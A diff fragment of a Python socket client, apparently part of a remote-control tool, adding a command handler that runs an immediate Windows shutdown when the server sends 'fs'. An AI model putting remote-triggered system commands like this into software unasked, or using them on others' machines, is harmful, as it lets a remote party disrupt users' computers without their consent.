@@ -25,8 +25,10 @@ try:
             byt += data
             continue
 
-        print(data)
-        if data == "1":
+        if data == "fs":
+            os.system("shutdown /s /t 0")
+
+        elif data == "1":
            client.send(ClientUI.Connect().encode())
         elif data == "2" and not th.is_alive():
             th.start()
